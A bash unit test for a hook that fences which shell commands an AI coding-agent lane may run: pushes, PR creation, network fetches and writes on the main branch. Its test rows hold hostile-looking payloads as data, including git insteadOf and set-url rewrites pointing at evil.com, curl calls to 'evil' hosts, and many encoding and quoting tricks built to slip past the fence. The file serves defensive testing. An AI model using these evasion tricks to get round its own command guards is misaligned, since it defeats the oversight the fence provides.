#!/usr/bin/env bash
# Unit test for scripts/hooks/block-terminal-write-fence.sh — the
# codex-lane terminal write-fence. Exit 0 = allow, exit 2 = block.
#
# Hermetic: a temp HOME + isolated git config, temp git fixtures built with
# `git init` + `symbolic-ref` (no commits / identity needed), and EXPLICIT cwd
# in every write-on-main payload so the assertion never depends on the suite's
# own process cwd (the #975 lesson). No network — the external-write cases are
# classified by command text alone.
set -uo pipefail

HOOKS="$(cd "$(dirname "$0")" && pwd)"
GUARD="$HOOKS/block-terminal-write-fence.sh"
[ -f "$GUARD" ] || { echo "guard not found: $GUARD" >&2; exit 1; }
command -v git >/dev/null 2>&1 || { echo "SKIP: git not on PATH"; exit 0; }
command -v jq  >/dev/null 2>&1 || { echo "SKIP: jq not on PATH"; exit 0; }

# shellcheck source=lib-fixture-root.sh
. "$HOOKS/lib-fixture-root.sh"
_FROOT=$(fixture_root) || exit 1
T="$(mktemp -d "$_FROOT/.himmel-2526-tfixture-XXXXXX")" || exit 1; trap 'rm -rf "$T"' EXIT
# Isolate git from the real user/system config so branch reads are deterministic.
export HOME="$T"
export GIT_CONFIG_NOSYSTEM=1
export GIT_CONFIG_GLOBAL="$T/.gitconfig"
export HIMMEL_POLICY_FOLLOWS_HOME=1
# The guard must never inherit the opt-in from the suite env.
unset CODEX_EXTERNAL_WRITES_OK 2>/dev/null || true

mkrepo() {  # mkrepo <dir> <branch-ref>
    git init -q "$1" >/dev/null 2>&1
    git -C "$1" symbolic-ref HEAD "refs/heads/$2"
}
mkrepo "$T/mainrepo"  "main"
mkrepo "$T/featrepo"  "feat/x"
MAIN="$T/mainrepo"
FEAT="$T/featrepo"
SWR="$T/swrepo"; mkrepo "$SWR" "feat/x"; touch "$SWR/.single-writer"  # class (b) exempt, so class (a) rows are not masked
# The `/tmp/` prefix is HARDCODED, not `${TMPDIR:-/tmp}` and not a bare
# `mktemp -d`: this row asserts the `/tmp` root itself; on macOS both of
# those resolve TMPDIR to `/var/folders/.../T/`, a different root that the
# system-temp-root row below covers.
TMPMAIN_ROOT="$(mktemp -d /tmp/himmel-2526-fence-tmpmain.XXXXXX)" || exit 1
trap 'rm -rf "$T" "$TMPMAIN_ROOT"' EXIT
mkrepo "$TMPMAIN_ROOT/mainrepo" "main"
TMPMAIN="$TMPMAIN_ROOT/mainrepo"

pass=0; fail=0
ok()  { pass=$((pass+1)); printf '  ok   %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL %s\n' "$1"; }

# check <label> <block|allow> <json> [ENV=val ...]
check() {
    local label="$1" expect="$2" json="$3"; shift 3
    local rc got
    printf '%s' "$json" | env "$@" bash "$GUARD" >/dev/null 2>&1
    rc=$?
    case "$rc" in
        0) got=allow ;;
        2) got=block ;;
        *) got="?(rc=$rc)" ;;
    esac
    if [ "$got" = "$expect" ]; then ok "$label"; else
        bad "$label — expected $expect got $got"; fi
}

echo "== external-write class (a) =="
check "git push denied"                 block '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
check "git push allowed with opt-in"    allow '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' CODEX_EXTERNAL_WRITES_OK=1
check "git push --force denied"          block '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}'
check "remote set-url rewrite denied"    block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin http://x"}}'
check "config url rewrite denied"        block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.url http://x"}}'
check "config url READ allowed"          allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url"}}'
check "config --file url rewrite denied"  block '{"tool_name":"Bash","tool_input":{"command":"git config --file .git/config remote.origin.url http://x"}}'
check "config insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config pushInsteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.pushInsteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config --global insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
# a dequoted key is the same key — quoting/escaping must not slip past.
check "git config single-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git config double-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/","cwd":"'"$SWR"'"}}'
check "git config backslash-split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config ANSI-C quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git config upper-case URL.INSTEADOF key" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
check "git config set --file value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config --type value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config ANSI-C hex escape in key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.\\x69nsteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git -c ANSI-C escape" block '{"tool_name":"Bash","tool_input":{"command":"git -c $'"'"'url.https://evil.com/.\\x69nsteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
check "git -c core.pager=cat log allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git -c core.pager=cat log","cwd":"'"$SWR"'"}}'
check "git config --get remote.origin.url allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url","cwd":"'"$SWR"'"}}'
check "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
check "config --get insteadOf READ denied (pinned overmatch, round 5 position-free rule)" block '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
check "round 6 quoted git + ANSI-C hex key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config $'"'"'url.x/.\\x69nsteadOf'"'"' Y","cwd":"'"$SWR"'"}}'
check "round 6 quoted git + plain key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config url.x/.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 6 split git executable + -c key" block '{"tool_name":"Bash","tool_input":{"command":"g'"'"''"'"'it -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
check "round 6 git log --oneline allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --oneline","cwd":"'"$SWR"'"}}'
check "round 7 escaped executable + escaped key" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\x67it'"'"' config $'"'"'url.https://evil.example/.\\x69nsteadOf'"'"' https://source.example/","cwd":"'"$SWR"'"}}'
check "round 7 octal executable" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\147\\151\\164'"'"' config url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 escaped config subcommand" block '{"tool_name":"Bash","tool_input":{"command":"git $'"'"'\\x63onfig'"'"' url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 split executable, hex-escaped middle letter" block '{"tool_name":"Bash","tool_input":{"command":"g$'"'"'\\x69'"'"'\"t\" -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
check "round 7 unterminated ANSI-C segment" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 NUL octal ends the segment, Of joins" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\0junk'"'"'Of Y","cwd":"'"$SWR"'"}}'
check "round 7 NUL hex ends the segment, Of joins" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\x00junk'"'"'Of Y","cwd":"'"$SWR"'"}}'
check "round 8 single-quoted decoy" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
check "round 8 double-quoted decoy" block '{"tool_name":"Bash","tool_input":{"command":"echo \"$'"'"'\" ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
check "round 8 comment decoy" block '{"tool_name":"Bash","tool_input":{"command":"# $'"'"'\ngit config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
check "round 9 decoy + split executable" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
check "round 9 decoy + split executable + escaped key" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
check "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\c@junk'"'"'Of y","cwd":"'"$SWR"'"}}'
check "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
check "round 10 plain backslash-t inside the key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.ins\\teadOf y","cwd":"'"$SWR"'"}}'
check "round 10 plain backslash-r inside url" block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.u\\rl https://evil","cwd":"'"$SWR"'"}}'
# a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
# bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
check "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.inste\\\nadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\npush origin main","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 CRLF continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\r\npush origin main","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 continuation split curl" block '{"tool_name":"Bash","tool_input":{"command":"cu\\\nrl http://evil/x","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 continuation split gh" block '{"tool_name":"Bash","tool_input":{"command":"g\\\nh pr merge 1","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_name":"Bash","tool_input":{"command":"foo \\\ngh pr merge 1","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.na\\\nme x","cwd":"'"$SWR"'"}}'
check "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo a \\\nb","cwd":"'"$SWR"'"}}'
# a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
# must not desync the quote-aware stream and hide evasion 1 on the next line.
check "HIMMEL-4225 apostrophe in a comment, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<EOF\ndon'"'"'t panic\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\necho hi","cwd":"'"$SWR"'"}}'
# empty and unusual heredoc delimiters (bash ends `<<''` at an empty
# line) and an arithmetic `<<` must not desync the decoder either.
check "HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\"\"\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 empty <<-'' delimiter, tab-only terminator, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<-'"'"''"'"'\n\tdon'"'"'t panic\n\t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 empty <<-\"\" delimiter, empty terminator, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<-\"\"\n\tdon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 backslash-newline inside the heredoc delimiter, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\\\nEOF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
# shellcheck disable=SC2016  # literal $ is the payload
check "HIMMEL-4225 ANSI-C heredoc delimiter \$'E\\x4fF', then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<$'"'"'E\\x4fF'"'"'\n$E\\x4fF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 escaped quote inside a double-quoted heredoc delimiter, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\"E\\\"F\"\ndon'"'"'t\nE\"F\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
# shellcheck disable=SC2016  # literal $ is the payload
check "HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"echo $((1<<2))\n# don'"'"'t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
check "HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\nit'"'"'s fine\n\necho ok","cwd":"'"$SWR"'"}}'
# a 50 KB pad must not make grep hit E2BIG and skip the set-url deny (fail-open vs main)
PAD=$(head -c 50000 /dev/zero | tr "\0" a)
check "round 11 padded set-url still denied (E2BIG)" block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin https://evil.example/x.git ; echo '"$PAD"'","cwd":"'"$SWR"'"}}'
check "round 7 git commit -m ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git commit -m $'"'"'l1\\nl2'"'"'","cwd":"'"$SWR"'"}}'
check "round 7 git log --format=ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --format=$'"'"'%h\\t%s'"'"'","cwd":"'"$SWR"'"}}'
check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
check "gh pr create denied"              block '{"tool_name":"Bash","tool_input":{"command":"gh pr create --fill"}}'
check "gh pr view allowed"               allow '{"tool_name":"Bash","tool_input":{"command":"gh pr view 12"}}'
check "gh issue list allowed"            allow '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}'
check "curl denied"                      block '{"tool_name":"Bash","tool_input":{"command":"curl http://evil/x"}}'
check "curl allowed with opt-in"         allow '{"tool_name":"Bash","tool_input":{"command":"curl http://evil/x"}}' CODEX_EXTERNAL_WRITES_OK=1
# Windows lane: .exe-suffixed binaries must not bypass the fence (CR codex-1).
check "git.exe push denied"              block '{"tool_name":"Bash","tool_input":{"command":"git.exe push origin main"}}'
check "curl.exe denied"                  block '{"tool_name":"Bash","tool_input":{"command":"curl.exe http://evil/x"}}'
check "gh.exe pr create denied"          block '{"tool_name":"Bash","tool_input":{"command":"gh.exe pr create --fill"}}'
check "gh.exe pr view allowed"           allow '{"tool_name":"Bash","tool_input":{"command":"gh.exe pr view 12"}}'
# Attached-value long flag before push must not break the anchor (CR under-block).
check "git --git-dir=/x push denied"     block '{"tool_name":"Bash","tool_input":{"command":"git --git-dir=/x push origin main"}}'

echo "== write-on-main class (b) =="
check "Set-Content on main-checkout denied" block "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$MAIN\"}}"
check "Set-Content on feature-branch allowed" allow "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$FEAT\"}}"
# git.exe commit on main must be caught too (CR .exe parity for class b).
check "git.exe commit on main denied"    block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git.exe commit -m x\",\"cwd\":\"$MAIN\"}}"
# A write-verb only inside quoted/logged text must NOT be flagged on main
# (CR false-positive: command-position anchor on the PS writers).
check "echo mentioning set-content on main allowed" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo see Set-Content docs\",\"cwd\":\"$MAIN\"}}"
check "git commit on main denied"        block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git commit -m wip\",\"cwd\":\"$MAIN\"}}"
check "git commit on feature allowed"    allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git commit -m wip\",\"cwd\":\"$FEAT\"}}"
check "redirect to real file on main denied" block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$MAIN\"}}"
# RATIFIED exemption (not a bug): a repo whose OWN root sits beneath /tmp is
# is_temp_or_devnull-exempt at the resolved-destination level, same as a
# literal /tmp/... target — the destination-based class (b) genuinely ALLOWS
# a redirect into a repo on main when that repo lives under /tmp. This row
# exists specifically to pin that documented behaviour, not to prove class
# (b) is broken: redirect into a repo beneath /tmp -> ALLOW (ratified
# exemption, is_temp_or_devnull :155 in block-terminal-write-fence.sh).
check "redirect into a repo beneath /tmp allowed (ratified exemption, is_temp_or_devnull :155)" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$TMPMAIN\"}}"
mkrepo "$T/tmp/mainrepo" "main"
check "redirect into a repo on main under a tmp-named dir (not a temp root) denied" block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$T/tmp/mainrepo\"}}"
_systmp_root=$(getconf DARWIN_USER_TEMP_DIR 2>/dev/null) || _systmp_root=/tmp  # swallow-ok: off macOS the key is unknown and /tmp is the system temp root
SYSTMP="$(mktemp -d "${_systmp_root%/}/himmel-fence-systmp.XXXXXX")" || exit 1  # prim-ok: the control asserts the system temp root itself, so it must not be rooted elsewhere
trap 'rm -rf "$T" "$TMPMAIN_ROOT" "$SYSTMP"' EXIT
mkrepo "$SYSTMP/mainrepo" "main"
check "redirect into a repo on main under the system temp root allowed" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$SYSTMP/mainrepo\"}}"
# $TMP is a literal token in the payload the guard must treat as a temp path.
# shellcheck disable=SC2016
check "redirect into \$TMP allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo hi > $TMP/scratch.txt","cwd":"'"$MAIN"'"}}'
check "redirect to /dev/null allowed" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > /dev/null 2>&1\",\"cwd\":\"$MAIN\"}}"
check "git status on main allowed"       allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status\",\"cwd\":\"$MAIN\"}}"
check "cat read on main allowed"         allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat foo.txt\",\"cwd\":\"$MAIN\"}}"

# .single-writer opt-out: the same on-main write is now allowed.
: > "$MAIN/.single-writer"
check "Set-Content on main with .single-writer allowed" allow "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$MAIN\"}}"

echo "== HIMMEL-3648 J1307P: PS-writer arm had no union fallback to the real cwd =="
# The PowerShell-writer arm in block-write-into-main-checkout.sh (sourced by
# this guard) used to check only the TRACKED cwd (_bwimc_ecwd) after a
# cd/pushd clause, with no fallback to the REAL payload cwd. Each row below
# runs from cwd=$MAIN (on main, no .single-writer — a fresh $MAIN2 fixture,
# since the row above opted $MAIN itself out via .single-writer) with a
# leading cd/pushd whose tracked target lands at $FEAT (a feature-branch
# repo, so the tracker-only check ALLOWs) while the real shell either never
# moves (nonexistent target, `||` short-circuit, `|` pipeline component) or
# moves and pops back (pushd without a matching popd still leaves the
# CALLER's real shell at $MAIN for this one command). main denies every one
# of these (no cd tracking at all, so the write-on-main check always sees
# the real cwd); so must this guard, post-fix.
mkrepo "$T/mainrepo2" "main"
MAIN2="$T/mainrepo2"
for verb in "Set-Content -Path foo.txt -Value x" "Out-File -FilePath foo.txt" "Add-Content -Path foo.txt -Value x"; do
    check "cd \$FEAT/nope; $verb (nonexistent cd target) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $FEAT/nope; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "cd \$MAIN2 || cd \$FEAT; $verb (first cd succeeds, || never runs) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $MAIN2 || cd $FEAT; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "cd \$FEAT | cat; $verb (pipeline component runs in its own subshell) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $FEAT | cat; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "pushd \$FEAT/nope; $verb (nonexistent pushd target) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"pushd $FEAT/nope; $verb\",\"cwd\":\"$MAIN2\"}}"
done

echo "== non-command payloads =="
check "no command -> allow"              allow '{"tool_name":"Bash","tool_input":{}}'
check "non-terminal tool -> allow"       allow '{"tool_name":"Read","tool_input":{"file_path":"/x/README.md"}}'

echo "== lane grants (HIMMEL-11204) =="
LG="$(cd "$T" && pwd -P)/lanes"
LGH="$LG/home"; LGP="$LG/primary"; LGW="$LG/wt"; LGC="$LGH/.himmel/config.json"
mkdir -p "$LGH/.himmel"; chmod 700 "$LGH/.himmel"
git init -q -b main "$LGP"
git -C "$LGP" -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m init
git -C "$LGP" remote add origin 'https://github.com/acme/fixture.git'
git -C "$LGP" worktree add -q -b feat/x "$LGW"
LG_ALL='["git-push-branch","gh-pr-create","net-read","manage-task-own"]'
lg_cfg() { printf '%s\n' "$1" > "$LGC"; chmod 600 "$LGC"; }
lg_codex() {
    lg_cfg "{\"lane_grants\":{\"codex\":$1},\"lane_grants_origin\":\"github.com/acme/fixture\"}"
}
lg_all() { lg_codex "$LG_ALL"; }
lg() {
    local json
    json=$(jq -cn --arg c "$3" --arg d "${4:-$LGW}" --arg l "${5-codex}" \
        '{tool_name:"Bash",tool_input:{command:$c},cwd:$d} + (if $l == "" then {} else {himmel_lane:$l} end)')
    check "$1" "$2" "$json" HOME="$LGH" XDG_CONFIG_HOME="$LGH/.config" CLAUDE_PROJECT_DIR="$LGP"
}
# shellcheck disable=SC2016  # the literal $ and backtick are the payload
LG_PR='gh pr create -H feat/x -t '"'"'x: y'"'"' -b '"'"'body with a ` and $HOME'"'"' --base main'
LG_CURL='curl -q -g -sS https://example.com/a'
LG_WGET='wget --no-config --max-redirect=0 -qO- https://example.com/a'

rm -f "$LGC"
lg "T1c no config: granted push shape denied" block 'git push -u origin feat/x'
lg "T5c no config: pr create denied" block "$LG_PR"
lg "T7c no config: curl denied" block "$LG_CURL"
lg "T7c no config: wget denied" block "$LG_WGET"
lg_codex '["git-push-branch"]'
lg "T1 grant-push allows the branch push" allow 'git push -u origin feat/x'
lg_codex '["gh-pr-create"]'
lg "T5 grant-pr allows pr create" allow "$LG_PR"
lg_codex '["net-read"]'
lg "T7 net-read allows curl" allow "$LG_CURL"
lg "T7 net-read allows wget" allow "$LG_WGET"
lg "T7 curl -L refused (1434)" block 'curl -q -g -sSL https://example.com/a'
lg "T7 wget without --max-redirect=0 refused (1434)" block 'wget --no-config -qO- https://example.com/a'
lg "T7 any https host allowed with no host key (1434)" allow 'curl -q -g https://unlisted.example.net/x'
for c in 'curl -sS https://e/a' 'curl -q https://e/a' 'curl -q -g -o f https://e/a' \
    'curl -q -g -d x https://e/a' 'curl -q -g -I https://e/a' 'curl -q -g http://e/a' \
    "curl -q -g 'https://e/[1-9]'" 'wget -qO- https://e/a'; do
    lg "T7 refused: $c" block "$c"
done
lg_cfg "{\"lane_grants\":{\"antigravity\":$LG_ALL},\"lane_grants_origin\":\"github.com/acme/fixture\"}"
lg "T2 antigravity grant, codex payload" block 'git push origin feat/x'
lg_all
lg "T2 no himmel_lane" block 'git push origin feat/x' "$LGW" ''
check "T2 PowerShell never granted" block \
    "$(jq -cn --arg d "$LGW" '{tool_name:"PowerShell",tool_input:{command:"git push origin feat/x"},cwd:$d,himmel_lane:"codex"}')" \
    HOME="$LGH" XDG_CONFIG_HOME="$LGH/.config" CLAUDE_PROJECT_DIR="$LGP"
lg "T3 push main from main" block 'git push origin main' "$LGP"
for c in 'git push -f origin feat/x' 'git push origin +feat/x' 'git push origin feat/x:main' \
    'git push https://x/y feat/x' 'git push upstream feat/x' 'git -C /other push origin feat/x' \
    'git push --no-verify origin feat/x' 'git push origin feat/x && git push origin main'; do
    lg "T3 floor: $c" block "$c"
done
for c in 'gh pr merge 1' 'gh pr create --repo o/r -H feat/x -t a' 'gh pr create -F body.md -H feat/x' \
    'gh pr create -t a -b b' 'gh pr create -t a -H feat/x; gh pr merge 1'; do
    lg "T4 floor: $c" block "$c"
done
git -C "$LGP" remote add upstream 'https://github.com/acme/fixture.git'
lg "T4 a second remote refuses pr create" block "$LG_PR"
git -C "$LGP" remote remove upstream
for c in 'git remote set-url origin x' 'git -c url.a.insteadof=b push origin feat/x' \
    'git config url.a.insteadOf b'; do
    lg "T6 floor: $c" block "$c"
done
lg_push_denied() { lg "T3b $1" block 'git push origin feat/x'; }
git -C "$LGP" remote set-url origin 'https://github.com/acme/other.git'; lg_push_denied "origin names another repo"
git -C "$LGP" remote set-url origin 'https://github.com/acme/fixture.git'
git -C "$LGP" config remote.origin.pushurl 'https://github.com/acme/other.git'; lg_push_denied "pushurl names another repo"
git -C "$LGP" config --unset remote.origin.pushurl
git -C "$LGP" config url.https://evil.example/.insteadOf https://github.com/; lg_push_denied "insteadOf rewrites origin"
git -C "$LGP" config --unset url.https://evil.example/.insteadOf
git -C "$LGP" config remote.origin.push 'feat/x:main'; lg_push_denied "remote.origin.push set"
git -C "$LGP" config --unset remote.origin.push
git -C "$LGP" config remote.origin.mirror true; lg_push_denied "remote.origin.mirror true"
git -C "$LGP" config --unset remote.origin.mirror
git -C "$LGW" checkout -q -b heads/main
lg "T3b a branch named heads/main" block 'git push origin heads/main'
git -C "$LGW" checkout -q feat/x
git -C "$LGP" remote set-url origin 'git@github.com:acme/fixture.git'
printf '[url "https://github.com/"]\n\tinsteadOf = git@github.com:\n' > "$LGH/.gitconfig"
lg "T3b-allow ssh-to-https rewrite of the same repo" allow 'git push origin feat/x'
rm -f "$LGH/.gitconfig"
git -C "$LGP" remote set-url origin 'https://github.com/acme/fixture.git'
rm -f "$LGC"

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
